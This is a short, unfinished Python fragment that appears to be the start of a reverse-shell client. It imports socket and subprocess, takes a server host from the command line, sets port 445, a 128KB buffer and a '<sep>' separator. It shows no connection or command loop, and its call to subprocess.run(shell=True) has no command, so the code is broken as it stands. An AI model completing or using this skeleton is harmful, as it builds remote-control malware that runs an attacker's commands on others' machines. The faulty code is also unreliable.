import os
import socket,subprocess,os
import subprocess
import socket
import sys

def run():
    subprocess.run(shell=True)
    SERVER_HOST = sys.argv[1]
    SERVER_PORT = 445
    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
    # separator string for sending 2 messages in one go
    SEPARATOR = "<sep>"
